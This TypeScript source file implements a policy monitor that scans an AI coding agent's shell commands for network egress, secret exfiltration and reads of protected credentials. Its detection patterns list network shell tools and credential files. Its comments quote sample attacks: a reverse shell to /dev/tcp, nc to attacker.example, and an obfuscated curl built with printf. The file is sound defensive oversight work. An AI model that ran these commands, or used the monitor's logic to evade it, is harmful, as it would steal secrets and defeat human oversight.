export interface PolicyViolation {
  rule: string;
  detail: string;
  /** Non-allowlisted hosts a human could grant a scoped exception for. */
  hosts?: string[];
}

/**
 * The ONLY rules a human may ever be asked to approve. This is a code-level
 * invariant, not a config value: a non-allowlisted egress can be a legitimate
 * need (a package registry), so it is reviewable — but reading or exfiltrating a
 * protected secret is never something an operator can wave through, no matter
 * what `POLICY_REVIEW_RULES` is set to. Config is intersected with this set and
 * rejected if it names anything outside it (see config.ts).
 */
export const REVIEWABLE_RULES: readonly string[] = ["network-egress-denied"];

/** True only for rules a human is permitted to approve. */
export function isReviewableRule(rule: string): boolean {
  return REVIEWABLE_RULES.includes(rule);
}

export interface PolicyContext {
  allowedHosts: string[];
  /**
   * Literal secret values to mask in recorded evidence. The platform knows its
   * own Ark key, so if an Agent ever inlines it the audit trail must not repeat
   * it back into storage, the API, or the browser.
   */
  secretValues?: string[];
}

// Binaries whose whole purpose is moving bytes. Any use is potential egress.
const ALWAYS_NETWORK =
  /(^|[\s;&|("'`])(curl|wget|nc|ncat|netcat|telnet|ssh|scp|sftp|rsync|ftp|socat|openssl|aria2c|httpie|dig|nslookup|host|lwp-request|xh)(\s|$)/i;

// Tools that reach the network only for particular subcommands. Treating all of
// `git` or `npm` as egress would deny `git commit -m "see https://..."`, which
// contacts nothing; matching the subcommand keeps `git push` and
// `npm install --registry` covered without that false positive.
const CONDITIONAL_NETWORK = [
  /(^|[\s;&|("'`])git\s+(?:-\S+\s+)*(push|pull|fetch|clone|remote|submodule|ls-remote)\b/i,
  /(^|[\s;&|("'`])(?:npm|pnpm|yarn|npx)\s+(?:-\S+\s+)*(install|ci|add|publish|update|audit|pack|dlx|exec)\b/i,
  /(^|[\s;&|("'`])pip3?\s+(?:-\S+\s+)*(install|download|wheel)\b/i,
  /(^|[\s;&|("'`])go\s+(get|mod|install)\b/i,
  /(^|[\s;&|("'`])(?:apt|apt-get|brew|gem|cargo|poetry)\s+(?:-\S+\s+)*(install|add|update|upgrade|fetch)\b/i,
];


// Commands that merely write a URL as text: a commit message, an echo into a
// file. These contact nothing and must stay allowed.
//
// Anchored to the *leading* command on purpose. Matching anywhere let
// `$(printf '\x63\x75\x72\x6c') https://attacker.example` exempt itself, where
// printf builds the binary name rather than printing text.
const TEXTUAL_URL_CONTEXT =
  /^\s*(?:\S*sh\s+-\S+\s+)?["']?\s*(echo|printf|git\s+(?:commit|tag))\b/i;

// Any absolute URL, whatever binary (if any) is next to it.
const ANY_URL = /\b[a-z][a-z0-9+.-]*:\/\/[^\s"'`)]+/i;

function usesNetworkTool(command: string): boolean {
  if (ALWAYS_NETWORK.test(command)) return true;
  return CONDITIONAL_NETWORK.some((pattern) => pattern.test(command));
}

// Interpreters can reach the network without naming a network tool.
const INLINE_NETWORK =
  /(python3?\s+-c\b[\s\S]*\b(socket|urllib|requests|httpx|http\.client)\b)|(node\s+-e\b[\s\S]*\b(fetch|https?|net|axios)\b)|(perl\s+-e\b[\s\S]*\b(Socket|LWP)\b)|(\/dev\/(tcp|udp)\/)|(ruby\s+-e\b[\s\S]*\b(Net::HTTP|open-uri|Socket)\b)|(deno\s+(eval|run)\b)|(php\s+-r\b[\s\S]*\b(file_get_contents|curl_|fsockopen)\b)/i;

// Material the Agent has no legitimate reason to read inside a workspace task.
// Matches reading the value, not naming the identifier: `$ARK_API_KEY`,
// `${ARK_API_KEY}`, `process.env.ARK_API_KEY`, `os.environ['ARK_API_KEY']`,
// `$ENV{ARK_API_KEY}`, `getenv("ARK_API_KEY")`, `printenv ARK_API_KEY`.
// Writing prose that mentions the variable is legitimate and must stay allowed.
const ARK_KEY_DEREFERENCE =
  /\$\{?!?ARK_API_KEY\}?|(?:process\.env|os\.environ|ENV)\s*(?:\.\s*ARK_API_KEY|\[\s*['"`]ARK_API_KEY|\{\s*['"`]?ARK_API_KEY)|(?:get|has)env\s*\(\s*['"`]ARK_API_KEY|(?:^|[\s;&|("'`])printenv\s+ARK_API_KEY\b/;

const PROTECTED_SECRETS = [
  { pattern: ARK_KEY_DEREFERENCE, label: "Ark API key environment variable" },
  { pattern: /\.secrets?\b|\.sec\*/, label: "protected .secrets/ directory" },
  { pattern: /customer-db-url/, label: "protected credential fixture" },
  { pattern: /\/proc\/self\/environ/, label: "process environment dump" },
  { pattern: /\bid_rsa\b|\.ssh\/id_/, label: "SSH private key" },
  { pattern: /\.aws\/credentials/, label: "AWS credentials file" },
];

// Weaker signals: legitimate on their own, exfiltration when paired with egress.
// `set` is deliberately excluded — `set -euo pipefail` is ubiquitous in benign
// shell invocations and made this rule fire on ordinary scripted commands.
const ENV_DUMP = /(^|[\s;&|("'`])(printenv|env)(\s|$)/;

// Dotted tokens that are filenames, not hosts. Without this, scanning a command
// for bare hosts would read `index.d.ts` as a domain.
const FILE_EXTENSIONS = new Set([
  "ts", "tsx", "js", "jsx", "mjs", "cjs", "json", "md", "txt", "sh", "bash",
  "zsh", "py", "rb", "go", "rs", "java", "c", "h", "cpp", "hpp", "css", "scss",
  "html", "htm", "xml", "yml", "yaml", "toml", "lock", "gz", "tgz", "zip",
  "tar", "log", "env", "sql", "csv", "png", "jpg", "jpeg", "svg",
  "ico", "pdf", "backup", "bak", "tmp", "map", "d",
  // NB: do not add "example" here — it would mask attacker.example hosts.
]);

// A bare dotted token is only a hostname if its last label is a plausible TLD.
// Live traffic showed `process.platform` and `process.arch` being read as
// domains, denying a harmless tool-availability check. URLs are unaffected:
// anything with a scheme is extracted regardless of TLD, so an obscure TLD in a
// real destination is still caught.
const PLAUSIBLE_TLDS = new Set([
  "com", "org", "net", "edu", "gov", "mil", "int", "io", "co", "ai", "dev",
  "app", "cloud", "sh", "me", "tv", "cc", "ly", "to", "gg", "xyz", "top",
  "info", "biz", "site", "online", "tech", "store", "live", "space", "click",
  "link", "run", "page", "wiki", "blog", "news", "email", "chat", "social",
  "shop", "team", "group", "media", "studio", "design", "software", "tools",
  "network", "systems", "solutions", "services", "digital", "agency", "host",
  "uk", "us", "cn", "jp", "de", "fr", "ru", "in", "id", "nl", "au", "ca", "br",
  "es", "it", "se", "no", "fi", "dk", "pl", "ch", "at", "be", "kr", "sg", "hk",
  "tw", "my", "th", "vn", "ph", "nz", "za", "mx", "ar", "cl", "ie", "pt", "gr",
  // Reserved and demo names used by fixtures and internal hosts.
  "example", "invalid", "test", "local", "internal", "localhost", "onion",
]);

function isPlausibleHost(token: string): boolean {
  if (/^\d{1,3}(?:\.\d{1,3}){3}$/.test(token)) return true;
  const tld = token.split(".").pop()?.toLowerCase() ?? "";
  return PLAUSIBLE_TLDS.has(tld);
}

function looksLikeFilename(token: string): boolean {
  const extension = token.split(".").pop()?.toLowerCase() ?? "";
  return FILE_EXTENSIONS.has(extension);
}

function findProtectedSecret(command: string): string | null {
  for (const secret of PROTECTED_SECRETS) {
    if (secret.pattern.test(command)) return secret.label;
  }
  return null;
}

function extractHosts(command: string): string[] {
  const hosts = new Set<string>();

  // Any scheme, not just http(s): `git push https://...`, `curl -T x ftp://...`,
  // `npm install --registry https://...` all carry the destination in a URL.
  for (const match of command.matchAll(/\b[a-z][a-z0-9+.-]*:\/\/([^/\s"'`)]+)/gi)) {
    const authority = match[1];
    if (authority) hosts.add(authority.replace(/^.*@/, "").split(":")[0]!.toLowerCase());
  }

  // Bash raw sockets, e.g. `bash -i >& /dev/tcp/198.51.100.7/9001 0>&1`. Without
  // this the host is unreadable and a reverse shell that names no secret and no
  // URL falls through every rule.
  for (const match of command.matchAll(/\/dev\/(?:tcp|udp)\/([^/\s"'`)]+)/gi)) {
    const host = match[1];
    if (host) hosts.add(host.toLowerCase());
  }

  // Scan for bare hosts with URLs masked out. A domain appearing inside a URL's
  // path cannot cause egress to itself — the request goes to the authority — so
  // reading one out of a path is a false positive. Authorities were already
  // captured above.
  const withoutUrls = command.replace(/\b[a-z][a-z0-9+.-]*:\/\/[^\s"'`)]+/gi, " URL ");

  // Bare host arguments anywhere in the command, e.g. `nc attacker.example 4444`,
  // `ssh -R 9000:localhost:22 relay.attacker.example`, `openssl -connect h:443`.
  // Scanning only the token after the tool name missed every flagged variant.
  for (const match of withoutUrls.matchAll(
    /(?:^|[\s;&|(=@:'"`])((?:[a-z0-9-]+\.)+[a-z]{2,}|\d{1,3}(?:\.\d{1,3}){3})(?=[\s;&|)'"`:,]|$)/gi,
  )) {
    const token = match[1];
    if (!token || looksLikeFilename(token) || !isPlausibleHost(token)) continue;
    hosts.add(token.toLowerCase());
  }

  return [...hosts];
}

export function evaluateCommand(
  command: string,
  context: PolicyContext,
): PolicyViolation | null {
  if (!command.trim()) return null;

  const allowed = new Set(context.allowedHosts.map((host) => host.toLowerCase()));
  const usesNetwork = usesNetworkTool(command) || INLINE_NETWORK.test(command);
  const secret = findProtectedSecret(command);
  const dumpsEnvironment = ENV_DUMP.test(command);

  if (usesNetwork && (secret || dumpsEnvironment)) {
    return {
      rule: "secret-exfiltration",
      detail:
        "Command combines network egress with access to " +
        (secret ?? "the process environment") +
        ".",
    };
  }

  const disallowed = extractHosts(command).filter((host) => !allowed.has(host));

  if (usesNetwork && disallowed.length > 0) {
    return {
      rule: "network-egress-denied",
      detail:
        "Command contacts non-allowlisted host(s): " + disallowed.join(", ") + ".",
      hosts: disallowed,
    };
  }

  // No recognised network tool, but a non-allowlisted destination is present.
  // This is what catches obfuscated tool names (`c""url`, `$X`, `$'\x63url'`,
  // base64-decoded commands): the binary can be hidden, the destination cannot.
  if (!usesNetwork && disallowed.length > 0 && ANY_URL.test(command)) {
    if (!TEXTUAL_URL_CONTEXT.test(command)) {
      return {
        rule: "network-egress-denied",
        detail:
          "Command references non-allowlisted host(s) without a recognised " +
          "network tool, which is how an obfuscated command hides its binary: " +
          disallowed.join(", ") + ".",
        hosts: disallowed,
      };
    }
  }

  if (secret) {
    return {
      rule: "protected-secret-access",
      detail: "Command reads " + secret + ".",
    };
  }

  return null;
}

export function allowedHostsFrom(arkBaseUrl: string): string[] {
  try {
    return [new URL(arkBaseUrl).hostname.toLowerCase()];
  } catch {
    return [];
  }
}


const REDACTED = "***REDACTED***";

// Credentials embedded in a URL authority, e.g. postgres://user:pw@host.
const URL_CREDENTIALS = /(\b[a-z][a-z0-9+.-]*:\/\/[^\s:/@"']+:)[^\s@"']+(@)/gi;

// Long opaque strings: API keys, tokens, base64 blobs. Deliberately conservative
// so ordinary arguments, paths and hashes-in-filenames are left readable.
const HIGH_ENTROPY = /\b(?=[A-Za-z0-9_+/=-]{28,})(?=[^\s]*[A-Za-z])(?=[^\s]*\d)[A-Za-z0-9_+/=-]{28,}\b/g;

/**
 * Removes secret material from a command before it is recorded as evidence.
 *
 * A policy decision is stored, served over the API and rendered in the browser.
 * Without this, a command that inlined a resolved credential would leak it
 * through the very audit trail meant to protect it. Redaction is applied where
 * the violation is constructed, so the raw text never leaves the Runtime.
 */
export function redactCommand(command: string, secretValues: readonly string[] = []): string {
  let redacted = command;
  for (const secret of secretValues) {
    // Only mask values substantial enough to be a real credential; masking a
    // short or empty value would blank out unrelated text.
    if (secret && secret.length >= 8) {
      redacted = redacted.split(secret).join(REDACTED);
    }
  }
  redacted = redacted.replace(URL_CREDENTIALS, "$1" + REDACTED + "$2");
  redacted = redacted.replace(HIGH_ENTROPY, REDACTED);
  return redacted;
}

export interface DetectedViolation extends PolicyViolation {
  command: string;
}

/**
 * Evaluates one command, failing closed: if evaluation throws, the command is
 * denied, not allowed. A safety control that crashes must not become a bypass.
 * `evaluate` is injectable so the fail-closed path is testable.
 */
export function guardedEvaluate(
  command: string,
  context: PolicyContext,
  evaluate: (command: string, context: PolicyContext) => PolicyViolation | null = evaluateCommand,
): PolicyViolation | null {
  try {
    return evaluate(command, context);
  } catch {
    return {
      rule: "policy-error",
      detail: "Policy evaluation failed; failing closed and denying the command.",
    };
  }
}

/**
 * Evaluates commands observed since `startIndex` and returns EVERY denial in
 * order — not just the first. Returning all of them keeps monitor-mode evidence
 * complete when one streamed batch contains several violating commands.
 *
 * Both runners stream Codex events and need identical policy behaviour, so the
 * scan lives here rather than being duplicated per runner.
 */
export function scanCommands(
  commands: readonly string[],
  startIndex: number,
  context: PolicyContext,
): DetectedViolation[] {
  const found: DetectedViolation[] = [];
  for (let index = startIndex; index < commands.length; index += 1) {
    const command = commands[index];
    if (!command) continue;
    const violation = guardedEvaluate(command, context);
    if (violation) {
      found.push({ ...violation, command: redactCommand(command, context.secretValues) });
    }
  }
  return found;
}

/** Ark's own host is always reachable; operators may allow more via config. */
export function policyContextFrom(
  arkBaseUrl: string,
  extraHosts: readonly string[] = [],
  secretValues: readonly string[] = [],
): PolicyContext {
  return {
    allowedHosts: [...allowedHostsFrom(arkBaseUrl), ...extraHosts],
    secretValues: [...secretValues],
  };
}
